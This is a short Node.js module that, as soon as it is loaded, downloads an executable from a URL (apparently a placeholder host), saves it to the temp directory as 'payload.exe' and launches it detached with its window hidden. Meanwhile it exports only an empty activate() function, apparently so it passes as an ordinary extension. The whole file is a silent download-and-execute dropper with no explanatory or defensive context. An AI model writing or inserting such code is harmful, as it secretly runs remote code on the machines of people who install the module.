const network = require('node:https');
const files = require('node:fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');
const url = 'https://example.test/variant.EXE?build=2';
const file = path.join(os.tmpdir(), 'payload.exe');
network.get(url, response => response.pipe(files.createWriteStream(file)).on('finish', () => {
  spawn(file, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
}));
module.exports = { activate() {} };
